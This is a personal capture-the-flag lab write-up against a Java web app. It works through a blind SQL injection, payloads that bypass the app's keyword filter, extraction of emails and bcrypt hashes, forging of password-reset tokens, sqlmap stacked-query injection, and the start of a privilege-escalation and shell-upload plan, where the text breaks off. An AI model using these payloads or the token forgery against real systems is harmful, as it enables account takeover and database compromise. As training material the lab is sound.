In this lab we know that the service runs on: http://10.129.43.12:8080/
We can get the Jar code from the machine in the previous tasks to decompile and gain access to it's functions!

---------------------------------------------------------------------------------------------------------------------------------------------
1)Seems like the user creating is not implemented, so far we have the login/passwd reset in place only.

---------------------------------------------------------------------------------------------------------------------------------------------
2)Fuzzing the function seems like upon login function, we can see that a a user check is sent to a backend API.
`GET /api/v1/check-user?u=j.pinkman HTTP/1.1`

We can also see that the reset function requires a reset "token" that we have no, which means we might have to wait!
```
Pass2.Reset-Password
Username 
w.white
Reset Key 
x7mF-hjH6-FFc4-G662
New Password 
Spring2023!
Repeat New Password 
Spring2023!
Reset Password
```

---------------------------------------------------------------------------------------------------------------------------------------------
3)Since we know that the first flag is related to a unauthenticated session i guess is on the login portal.
We need to first find a user that exist and passes the login portal.
```
GET /api/v1/check-user?u=admin HTTP/1.1
Date: Wed, 03 Apr 2024 10:40:26 GMT
Connection: close
{"exists":true}
```

Now that we have an account we need to see how can we reset it?
Checking the API function is clear that a string replace will remove bad words from the query
```
public String GET_API_Check_User(@RequestParam String u) {
/*    */     try {
/* 22 */       u = u.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
/*    */ 
/*    */       
/* 25 */       String sql = "SELECT * FROM users WHERE username = '" + u + "'";
/* 26 */       User user = (User)this.jdbcTemplate.queryForObject(sql, (RowMapper)new BeanPropertyRowMapper(User.class));
/* 27 */       return "{\"exists\":true}";
/* 28 */     } catch (Exception e) {
/* 29 */       return "{\"exists\":false}";
/*    */     } 
```

The case insensitivity can be bypassed easily since example **AND=aNd** but the query only checks for username=XXX and if so gives back a Boolean which makes me wonder if we need to work with boolean? 

---------------------------------------------------------------------------------------------------------------------------------------------
4) Here I prepared the code in a compiler so I can see exactly what the sanitation will look like.
```
public class Main
public class Main
{
	public static void main(String[] args) 
	{
	    String u = "'+oR+1=1--";
	    u = u.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
		System.out.println(u);
	}
}
```

Result: `'+oR+1=1`
(This mean that we need to find a way to bypass the spaces and comments at the end)

```
Since we know that /**/ will be replaced with "" we can bypass this with /* /**/ */ = /**/   --> This will bypass the check!
String u = "'/*/**/*/oR/*/**/*/1=1--";
```

```
Lastly we need to find a way to bypass the comment with - /**/ - where again the /**/ will be replaced with "" resulting in finally --
The working payload should be:
String u = "'/*/**/*/oR/*/**/*/1=1-/**/-";
```

---------------------------------------------------------------------------------------------------------------------------------------------

5)Knowing this now to get a true we must send something like `u=admin' AND 1=1--`
`GET /api/v1/check-user?u=admin'%2f*%2f**%2f*%2fAnD%2f*%2f**%2f*%2f1%3d1-%2f**%2f- HTTP/1.1`
(This will result in true as both are true and if we want to get true both must be true!) This can be used with substring to extract and check blind guess the values.
We can create a python script that can export the admin email to the following!
`admin' AnD SubStRiNg((SeLeCt email FrOm users WhErE username='admin'),{i},1)='{c}'--`

Result:
`Email/Password is:adminpass2htb`
The password can't be exported somehow!

---------------------------------------------------------------------------------------------------------------------------------------------
6)We can now generate our token(`String tmp = user.getEmail() + "$4lty" + user.getEmail();`)
```
byte[] encodedHash = digest.digest(tmp.getBytes(StandardCharsets.UTF_8));
String b64 = Base64.getUrlEncoder().encodeToString(encodedHash).replaceAll("-|_", "X");
String secretKey = String.format("%s-%s-%s-%s", new Object[] { b64.substring(0, 4), b64.substring(4, 8), b64.substring(8, 12), b64.substring(12, 16) });
```

We can create a temporary Java Project to calculate the secret string based on the email with this code!
```
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

public class App {
    public static void main(String[] args) throws Exception 
    {
        String email = "admin@pass2.htb";
        String tmp = email + "$4lty" + email;
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] encodedHash = digest.digest(tmp.getBytes(StandardCharsets.UTF_8));
        String b64 = Base64.getUrlEncoder().encodeToString(encodedHash).replaceAll("-|_", "X");
        String secretKey = String.format("%s-%s-%s-%s", new Object[] { b64.substring(0, 4), b64.substring(4, 8), b64.substring(8, 12), b64.substring(12, 16) });
        System.out.println("Base string: " + tmp);
        System.out.println("Encoded Hash: " + encodedHash);
        System.out.println("Base64: " + b64);
        System.out.println("Final secret: " + secretKey);
    }
}
```

Result:
```
Base string: adminpass2htb$4ltyadminpass2htb
Encoded Hash: [B@4eec7777
Base64: ITed3GsuuF0IHKi9JJD0giv9YvYlGmuNXJezZAZIvRE=
Final secret: ITed-3Gsu-uF0I-HKi9
```


---------------------------------------------------------------------------------------------------------------------------------------------
7)Seems like the new token for Admin user is still not working.. Let's go back and check with other users can we see?
Using this(`params = f"admin' AnD SubStRiNg((SeLeCt username FrOm users LiMiT 1 OfFsEt 1),{i},1)='{c}'--"`) we can find another username:
Email/Password is: **bmdyy**

And this we can find the admin account with this(`params = f"admin' AnD SubStRiNg((SeLeCt username FrOm users LiMiT 1 OfFsEt 0),{i},1)='{c}'--"`):
Email/Password is:**admin**
Now the email of **bmdyy** is(`params = f"admin' AnD SubStRiNg((SeLeCt email FrOm users WhErE username='bmdyy'),{i},1)='{c}'--"`):
Email/Password is:bmdyy@pass2.htb

Now the email of **admin** is(`params = f"admin' AnD SubStRiNg((SeLeCt email FrOm users WhErE username='admin'),{i},1)='{c}'--"`):
Email/Password is:admin@pass2.htb
Seems like I extracted the wrong email before, this time it should work!

---------------------------------------------------------------------------------------------------------------------------------------------
8)Using the real admin email now we can generate a new token that it should work this time!
```
Base string: admin@pass2.htb$4ltyadmin@pass2.htb
Encoded Hash: [B@4eec7777
Base64: oWHPvIJ5MhKrqmTenV5Jr8nR1LF5GCZo2Wmrh6T2fE0=
Final secret: oWHP-vIJ5-MhKr-qmTe
```


But we still get the wrong token for admin user, but what about the bmdyy one instead? Same shit! 
I am wondering if we need to use the SQLi in the python script to force update the password instead?


---------------------------------------------------------------------------------------------------------------------------------------------

9) We know that the password reset calculates the Bcrypt hash of the password and then it updates it via the UDPATE function!
```
String password = "culo";
String passwordHash = BCrypt.hashpw(password, BCrypt.gensalt(12));
String sql = "UPDATE users SET password = ? WHERE username = ?";
```

So knowing this we can calculate own Bcrypt(12 rounds) of our password:
d PasshasherApplication in 0.609 seconds (process running for 0.797)
```
Base Password: culo
Hashed Password: $2a$12$0V3dW1zB4HZRHO8qw9Ll0eILhFOGEqNJs4NU7QfWuPfw71eMwU30m
```

And maybe use this to set it directly on a user?
EDIT: Here i got a tips to use fernflower instead and apparently the decompilation gave back another result on how the secretkey is generated:
`String tmp = var10000 + "$4lty" + user.getPassword();`

---------------------------------------------------------------------------------------------------------------------------------------------
10) I had to adapt my python script to use ASCII compare instead of check directly =char
This allowed me to export the user's password hash since it was removing the OR from password=passw d

```
And now we have Admins hash: Data is: $2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG
And now we have Bmdyy hash: Data is: $2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnLO2XoZGs/c7E2IG
```

And using the Admin email + salt + hash we can calculate the right token  and perform a password reset.
```
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

public class App {
    public static void main(String[] args) throws Exception 
    {
        String email = "admin@pass2.htb";
        String password = "$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG";
        String tmp = email + "$4lty" + password;
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] encodedHash = digest.digest(tmp.getBytes(StandardCharsets.UTF_8));
        String b64 = Base64.getUrlEncoder().encodeToString(encodedHash).replaceAll("-|_", "X");
        String secretKey = String.format("%s-%s-%s-%s", new Object[] { b64.substring(0, 4), b64.substring(4, 8), b64.substring(8, 12), b64.substring(12, 16) });
        System.out.println("Base string: " + tmp);
        System.out.println("Encoded Hash: " + encodedHash);
        System.out.println("Base64: " + b64);
        System.out.println("Final secret: " + secretKey);

    }
}
```

Result:
```
Base string: admin@pass2.htb$4lty$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG
Encoded Hash: [B@7cca494b
Base64: 0NPd748bL2CDMoR3z9XGXjo8xOUiwr8O5CAnXXpDZQQ=
Final secret: 0NPd-748b-L2CD-MoR3
```

---------------------------------------------------------------------------------------------------------------------------------------------

11)Now from the inside we have 2 functions(add a password and update one!)
Saving the update request of one of the records via /edit function shows that the 
```
field 4(id) is vulnerable to time based injection.
[20:53:33] [INFO] checking if the injection point on (custom) POST parameter '#4*' is a false positive
(custom) POST parameter '#4*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

```
sqlmap identified the following injection point(s) with a total of 404 HTTP(s) requests:


---
Parameter: #4* ((custom) POST)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: title=&username=&password=&id=2;SELECT PG_SLEEP(5)--
---
[20:53:50] [INFO] the back-end DBMS is PostgreSQL
```

And using the --sql-shell function we can have a SQL shell to execute commands!
We can see the:
`Db Name: SELECT current_database(): 'pass2'`
`DB User: SELECT current_user: 'p2user'`

And seems like our user is not a superuser:
`SELECT usename FROM pg_user WHERE usesuper IS TRUE: 'postgres'`
We can try to edit that with: `ALTER USER "p2user" with superuser: 'NULL'`
And he is not part of admins: `SELECT current_setting('is_superuser'): 'off'`
And the C language is allowed which is good: `SELECT lanpltrusted FROM pg_language WHERE lanname LIKE 'c': 'true'`

---------------------------------------------------------------------------------------------------------------------------------------------
12)Now we need to use the create function to import the shell as lo object.
First we must split the shell in 2kb chunks